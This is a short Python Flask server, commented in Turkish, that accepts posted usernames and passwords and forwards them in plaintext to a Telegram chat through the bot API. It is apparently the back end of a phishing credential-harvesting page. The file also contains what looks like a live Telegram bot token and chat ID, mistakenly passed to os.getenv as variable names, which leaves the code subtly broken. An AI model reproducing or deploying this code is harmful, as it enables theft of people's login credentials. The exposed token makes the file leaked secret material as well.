from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Telegram bilgilerini çevresel değişkenlerden alıyoruz
BOT_TOKEN = os.getenv("7877952923:AAH45-_l94zL5JEY7fsSwiV3qRGR8jQ1Wbw")
CHAT_ID = os.getenv("7107883815")

# Telegram'a mesaj gönderme fonksiyonu
def send_to_telegram(username, password):
    message = f"Kullanıcı Adı: {username}\nŞifre: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/send', methods=['POST'])
def send():
    try:
        data = request.get_json()
        username = data.get("username")
        password = data.get("password")
        
        if username and password:
            send_to_telegram(username, password)
            return jsonify({"message": "Bilgiler Telegram’a gönderildi!", "status": "success"})
        else:
            return jsonify({"message": "Eksik bilgi!", "status": "error"}), 400

    except Exception as e:
        return jsonify({"message": str(e), "status": "error"}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
